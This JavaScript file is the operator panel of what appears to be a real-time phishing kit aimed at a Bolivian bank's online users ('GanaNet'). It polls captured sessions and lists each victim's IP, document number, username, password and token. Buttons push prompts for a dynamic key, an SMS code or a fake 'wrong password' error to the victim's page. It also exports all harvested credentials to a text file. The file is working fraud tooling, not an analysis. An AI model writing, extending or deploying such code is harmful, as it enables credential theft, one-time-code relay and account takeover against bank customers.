/**
 * Panel operador GanaNet.
 * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
 */
const LANE_COUNT = 5

const emptyState = document.getElementById('emptyState')
const rowCount = document.getElementById('rowCount')
const hint = document.getElementById('hint')
const btnClean = document.getElementById('btnClean')
const btnExport = document.getElementById('btnExport')

/** @type {Map<string, object>} */
const rows = new Map()

function statusLabel(state) {
  if (state === 'waiting') return 'En espera'
  if (state === 'active') return 'Activo'
  if (state === 'done') return 'Listo'
  if (state === 'error-login') return 'Error de datos'
  if (state === 'error') return 'Error'
  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
  if (state === 'waiting-sms') return 'SMS solicitado'
  if (state === 'received-dinamica') return 'Dinámica'
  if (state === 'received-sms') return 'SMS'
  if (state === 'error-dinamica') return 'Error Dinámica'
  if (state === 'error-sms') return 'Error SMS'
  if (state === 'typing') return 'Escribiendo código'
  return 'Nuevo'
}

function badgeClass(state) {
  if (state === 'typing') {
    return 'badge badge--typing'
  }
  if (
    state === 'waiting' ||
    state === 'waiting-dinamica' ||
    state === 'waiting-sms'
  ) {
    return 'badge badge--wait'
  }
  if (state === 'active') return 'badge badge--hola'
  if (state === 'done') return 'badge badge--done'
  if (state === 'received-dinamica' || state === 'received-sms') {
    return 'badge badge--login'
  }
  if (
    state === 'error-login' ||
    state === 'error-dinamica' ||
    state === 'error-sms' ||
    state === 'error'
  ) {
    return 'badge badge--error'
  }
  return 'badge badge--login'
}

function formatTime(ts) {
  try {
    return new Date(ts).toLocaleTimeString('es-BO', {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    })
  } catch (_) {
    return '—'
  }
}

function laneForIndex(index) {
  return ((Number(index) || 1) - 1) % LANE_COUNT
}

function getLaneBody(lane) {
  return document.querySelector(`[data-lane-body="${lane}"]`)
}

function getDeviceIcon(device) {
  if (device === 'mobile') {
    return `
      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
          <line x1="12" y1="18" x2="12.01" y2="18"></line>
        </svg>
        Celular
      </span>
    `
  }
  return `
    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
        <line x1="8" y1="21" x2="16" y2="21"></line>
        <line x1="12" y1="17" x2="12" y2="21"></line>
      </svg>
      PC
    </span>
  `
}

function isOnline(row) {
  return !!row.online;
}

async function setRowState(rowId, state, action) {
  const row = rows.get(rowId)
  if (!row) return
  row.state = state
  row.last_seen = Date.now()
  row.updatedAt = Date.now()
  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`

  try {
    await fetch(`/api/sessions/${rowId}/action`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, state })
    });
  } catch (_) {}
  render()
}

function createRow(row) {
  const tr = document.createElement('tr')
  tr.dataset.rowId = row.id
  tr.innerHTML = `
    <td class="col-num"></td>
    <td class="col-time mono"></td>
    <td class="col-tipo mono"></td>
    <td class="col-device"></td>
    <td class="col-ip mono"></td>
    <td class="col-user mono"></td>
    <td class="col-pass mono copyable" title="Copiar clave"></td>
    <td class="col-token mono copyable" title="Copiar token"></td>
    <td class="col-online"></td>
    <td class="col-status"></td>
    <td>
      <div class="row-actions">
        <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
        <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
        <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
        <button type="button" class="btn btn--done" data-action="done">Listo</button>
      </div>
    </td>
  `

  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-dinamica', 'dinamica')
  })
  tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
    setRowState(row.id, 'waiting-sms', 'sms')
  })
  tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-login', 'error-login')
  })
  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-dinamica', 'error-dinamica')
  })
  tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
    setRowState(row.id, 'error-sms', 'error-sms')
  })
  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
    setRowState(row.id, 'done', 'done')
  })

  tr.querySelectorAll('td.copyable').forEach((td) => {
    td.addEventListener('click', async () => {
      const text = td.textContent?.trim()
      if (!text || text === '—') return
      try {
        await navigator.clipboard.writeText(text)
        td.classList.add('copied')
        setTimeout(() => td.classList.remove('copied'), 900)
      } catch (_) {
        /* ignore */
      }
    })
  })

  tr.querySelector('.col-user').addEventListener('click', async (event) => {
    const pill = event.target.closest('.copy-subpill');
    if (!pill) return;
    const val = pill.dataset.val;
    if (!val || val === '—') return;
    try {
      await navigator.clipboard.writeText(val);
      pill.classList.add('copied');
      setTimeout(() => pill.classList.remove('copied'), 900);
    } catch (_) {}
  });

  return tr
}

function updateRow(tr, row) {
  const online = isOnline(row)
  tr.querySelector('.col-num').textContent = String(row.index)
  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
  tr.querySelector('.col-tipo').textContent = row.tipo
  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
  tr.querySelector('.col-ip').textContent = row.ip || '—'
  const userCell = tr.querySelector('.col-user');
  const userStr = row.user || '—';
  if (userStr.includes(' / ')) {
    const parts = userStr.split(' / ');
    const docPart = parts[0];
    const namePart = parts[1];
    let docNum = docPart;
    if (docPart.includes(':')) {
      docNum = docPart.split(':')[1];
    }
    userCell.innerHTML = `
      <span class="copy-subpill" data-val="${docNum}" title="Copiar Documento (${docPart})">${docPart}</span>
      <span class="subpill-divider">/</span>
      <span class="copy-subpill" data-val="${namePart}" title="Copiar Usuario">${namePart}</span>
    `;
  } else {
    userCell.innerHTML = `<span class="copy-subpill" data-val="${userStr}">${userStr}</span>`;
  }
  tr.querySelector('.col-pass').textContent = row.clave || '—'
  tr.querySelector('.col-token').textContent = row.token || '—'
  tr.querySelector('.col-online').innerHTML = online
    ? '<span class="pill pill--online">En línea</span>'
    : '<span class="pill pill--offline">Off</span>'
  tr.querySelector('.col-status').innerHTML =
    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`

  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
  const smsBtn = tr.querySelector('[data-action="sms"]')
  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
  tr.classList.toggle('is-waiting', row.state === 'waiting')
}

function render() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
  list.forEach((row, i) => {
    row.index = i + 1
  })
  rowCount.textContent = String(list.length)
  emptyState.classList.toggle('is-visible', list.length === 0)

  const byLane = Array.from({ length: LANE_COUNT }, () => [])
  list.forEach((row) => {
    byLane[laneForIndex(row.index)].push(row)
  })

  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
    const body = getLaneBody(lane)
    if (!body) continue
    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
    const countEl = laneEl?.querySelector('[data-lane-count]')
    const laneRows = byLane[lane]
    if (countEl) countEl.textContent = String(laneRows.length)

    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
      if (!rows.has(tr.dataset.rowId)) tr.remove()
    })

    laneRows.forEach((row) => {
      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
        (node) => node.dataset.rowId === row.id,
      )
      if (!tr) {
        tr = createRow(row)
        body.appendChild(tr)
      }
      updateRow(tr, row)
    })
  }
}

async function pollSessions() {
  try {
    const response = await fetch('/api/sessions');
    if (response.ok) {
      const list = await response.json();
      
      // Track existing new entries
      const oldKeys = new Set(rows.keys());
      const newKeys = new Set(list.map(s => s.id));
      
      rows.clear();
      list.forEach((session) => {
        rows.set(session.id, {
          id: session.id,
          index: session.index,
          createdAt: session.createdAt,
          updatedAt: session.updatedAt,
          last_seen: session.last_seen,
          tipo: session.tipoUsuario || session.tipo || 'CODIGO_PERSONA',
          device: session.device || 'desktop',
          ip: session.ip || '127.0.0.1',
          user: session.username || session.user || '—',
          clave: session.password || session.clave || '—',
          token: session.token || '',
          state: session.state || 'waiting',
          online: session.online
        });
      });
      render();

      // Trigger flash effect for new rows that were not in old list
      list.forEach((session) => {
        if (!oldKeys.has(session.id)) {
          requestAnimationFrame(() => {
            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
            if (!tr) return
            tr.classList.add('is-new')
            setTimeout(() => tr.classList.remove('is-new'), 1800)
          })
        }
      });
    }
  } catch (_) {}
}

btnClean?.addEventListener('click', async () => {
  rows.clear()
  try {
    await fetch('/api/clear', { method: 'POST' });
  } catch (_) {}
  hint.textContent = 'Cola limpia. Esperando nuevos usuarios…'
  render()
})

function exportToNotepad() {
  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
  if (list.length === 0) {
    alert("No hay información en el panel para guardar.");
    return;
  }

  let text = "";
  list.forEach((row, i) => {
    text += `=== SESION #${i + 1} ===\r\n`;
    text += `Fecha/Hora: ${new Date(row.createdAt).toLocaleString('es-CO')}\r\n`;
    text += `Tipo: ${row.tipo}\r\n`;
    text += `Dispositivo: ${row.device}\r\n`;
    text += `IP: ${row.ip}\r\n`;
    text += `Usuario: ${row.user}\r\n`;
    text += `Clave: ${row.clave}\r\n`;
    text += `Token: ${row.token || '—'}\r\n`;
    text += `Estado final: ${statusLabel(row.state)}\r\n`;
    text += `========================\r\n\r\n`;
  });

  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = `sesiones_panel_${Date.now()}.txt`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

btnExport?.addEventListener('click', () => {
  exportToNotepad();
});

// Poll sessions every 2 seconds
window.setInterval(pollSessions, 2000)

// Initial load
pollSessions().then(() => {
  hint.textContent = rows.size
    ? `En cola: ${rows.size}. Elige Dinámica o SMS en Acciones.`
    : 'Esperando usuarios del login… Al ingresar llegan aquí ordenados.'
});
